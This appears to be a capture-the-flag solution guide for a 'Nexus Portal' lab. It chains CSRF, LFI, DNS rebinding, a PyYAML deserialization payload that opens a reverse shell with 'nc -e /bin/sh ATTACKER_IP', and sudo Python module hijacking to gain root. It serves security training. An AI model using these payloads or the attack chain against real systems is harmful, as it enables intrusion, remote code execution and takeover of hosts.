# Nexus Portal - Solution Guide

This guide details the step-by-step exploitation of the Nexus Portal CTF scenario.

## Automated Exploit
A fully automated python script `exploit.py` is provided.
Run it as follows (ensure you have a listener ready for reverse shells if needed, though the script automates the chain):
```bash
# Start a netcat listener in a separate terminal for the specific steps if prompted
# nc -nlvp 1337 (WebApp Shell)
# nc -nlvp 1338 (Internal Service Shell)

python3 exploit.py [ATTACKER_IP]
```

## Manual Walkthrough

### Step 1: CSRF (Admin Access)
1.  Register a user (e.g., `attacker`).
2.  Host a malicious HTML page that sends a GET request to `http://127.0.0.1/make_admin?username=attacker`.
3.  Go to **Support Ticket** and submit the URL of your malicious page.
4.  Wait 5 seconds for the bot to check it.
5.  Logout and Login. You should now see the **Admin Panel**.

### Step 2: LFI (Source Leak)
1.  Go to the Admin Panel.
2.  In the "System Logs" viewer, change the `logfile` parameter to `main.py`.
3.  Read the source code. Note the `AUTH_TOKEN` generation and the `/healthcheck` endpoint logic.

### Step 3: DNS Rebinding (WebApp RCE)
1.  The "External Link Scanner" (`/admin?url=...`) blocks `127.0.0.1` but follows links with the `X-Nexus-Token`.
2.  Use a DNS Rebinding service (like `rbndr.us`) to create a domain that resolves to `8.8.8.8` (pass check) and then `127.0.0.1` (attack).
3.  Example Domain: `7f000001.08080808.rbndr.us`
4.  Payload (URL Encoded): `http://<rebind_domain>/healthcheck?cmd=python3 -c ...reverse_shell...`
5.  Spam the scanner with this URL until the DNS cache flips to `127.0.0.1` after the check, sending the request to localhost.
6.  Catch the reverse shell on port 1337.

### Step 4: Lateral Movement (Internal Service)
1.  From the WebApp shell, scan the network or check `/etc/hosts` to find `internal_service` on port 5000.
2.  The service consumes YAML at `/process_config`.
3.  Construct a **PyYAML RCE Payload** (CVE-2020-14343):
    ```yaml
    !!python/object/apply:os.system ["nc -e /bin/sh ATTACKER_IP 1338"]
    ```
4.  **Important**: Use Base64 encoding to send this via `curl` to avoid shell escaping issues.
    ```bash
    echo "ISFweXRob24v..." | base64 -d | curl -H 'Content-Type: text/plain' -X POST http://internal_service:5000/process_config --data-binary @-
    ```
5.  Catch the shell on port 1338.

### Step 5: Privilege Escalation (Python Hijacking)
1.  As `developer` on the internal container, run `sudo -l`.
2.  Notice you can run: `(root) NOPASSWD: /usr/local/bin/python /app/cleanup.py`.
3.  Check `/app/cleanup.py` content: it imports `shutil`.
4.  Check permissions: `/app` is writable by you.
5.  Create a malicious file `/app/shutil.py`:
    ```python
    import os
    os.system("/bin/bash")
    ```
6.  Run the sudo command: `sudo /usr/local/bin/python /app/cleanup.py`.
7.  You define `shutil`, so your code runs as root.
8.  Enjoy your root shell!
